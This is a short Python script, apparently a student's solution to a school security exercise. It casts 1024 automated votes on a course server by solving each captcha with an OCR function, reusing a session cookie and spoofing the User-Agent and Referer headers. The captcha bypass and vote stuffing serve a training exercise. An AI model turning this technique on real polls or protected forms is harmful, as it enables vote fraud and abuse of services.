"""
 *
 * ===---Description------------------------------------------------------------===
 *  Solution for the Hodor Project, Level 3 by Julien Barbier.
 *  Using Python script and some Deep Learning stuff...
 *
 *  by Alexandro de Oliveira, for Holberton School
 * ===--------------------------------------------------------------------------===
 *
"""
import requests
from deeplearning import image_to_string

url = 'http://173.246.108.142/level3.php'
captcha_image = 'http://173.246.108.142/captcha.php'

params = {
    'id': '23',
    'holdthedoor': 'submit',
    }

headers = {
    "User-Agent": "Windows NT 100.0.0.0.1a (aka: Blue Screen of Death) Python Post Requests from anywhere - Alexandro de Oliveira",
    "Referer": url
    }

count = 0
for i in range(0, 1024):
    req = requests.session()
    c_image = req.get(captcha_image, headers=headers)
    with open('tmp.png', 'w') as f:
        for i in c_image:
            f.write(i)

    captcha = image_to_string("tmp.png")
    captcha = ' '.join(captcha.split())
    body = req.head(url, headers=headers)
    cookie1 = req.cookies['HoldTheDoor']
    params['key'] = cookie1
    params['captcha'] = captcha
    response = req.post(url, data=params, headers=headers)
    if response:
        print "Vote number: " + str(count + 1)
        count += 1
    else:
        "Connection error... (vote not computed!)"
    req.close()
